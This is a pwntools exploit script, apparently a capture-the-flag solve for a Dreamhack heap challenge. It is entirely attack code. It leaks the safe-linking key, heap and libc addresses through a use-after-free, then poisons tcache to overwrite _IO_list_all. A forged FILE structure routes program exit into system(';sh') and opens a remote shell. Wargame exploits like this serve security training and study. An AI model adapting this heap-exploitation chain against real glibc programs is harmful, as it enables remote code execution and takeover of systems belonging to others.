from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 12472
r = remote(HOST, PORT)

def create(idx, data):
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendafter(b': ', data)

def update(idx, data):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendafter(b': ', data)

def read(idx):
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b': ', b'%d'%idx)

def delete(idx):
    r.sendlineafter(b'choice: ', b'4')
    r.sendlineafter(b': ', b'%d'%idx)

def exit():
    r.sendlineafter(b'choice: ', b'5')

create(0, b'A')
create(1, b'A')
create(2, b'A')
create(3, b'A')

delete(0)
delete(1)
read(0)
r.recvuntil(b': ')
key = u64(r.recvline().strip().ljust(8,b'\x00'))

read(1)
r.recvuntil(b': ')
heap = u64(r.recvline().strip().ljust(8,b'\x00'))
heap ^= key

for i in range(6):
    update(0, b'A'*0x10)
    delete(0)

read(0)
r.recvuntil(b': ')
libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x21ace0
system = libc + 0x50d70
_IO_wfile_jumps = libc + 0x2170c0
file = heap + 0xc0
_IO_list_all = libc + 0x21b680

payload = flat({
    0x0: b'\x01\x01\x01\x01;sh\x00',
    0x20: 0,
    0x28: 1,
    0x68: system,
    0x88: file+0x300,
    0xa0: file,
    # 0xd8: _IO_wfile_jumps,
    # 0xe0: file
},filler=b'\x00')
update(1, payload)

payload = p64(0)*3 + p64(_IO_wfile_jumps) + p64(file)
update(2, payload)

update(0, p64(_IO_list_all ^ key))

create(3, b'A')
create(4, p64(file))

exit()

r.interactive()